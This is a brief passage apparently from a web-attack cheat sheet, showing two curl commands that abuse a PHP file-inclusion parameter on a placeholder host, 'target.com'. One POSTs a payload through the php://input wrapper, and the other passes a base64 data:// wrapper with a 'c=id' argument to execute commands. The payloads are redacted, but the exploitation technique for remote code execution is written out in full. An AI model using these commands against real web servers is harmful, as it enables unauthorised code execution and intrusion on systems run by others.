...
curl -X POST -d "[REDACTED_RCE_PAYLOAD]" \
     "http://target.com/page?file=php://input"

# data:// - Execute inline PHP
curl "http://target.com/page?file=data://text/plain;base64,[REDACTED_BASE64_PAYLOAD]&c=id"
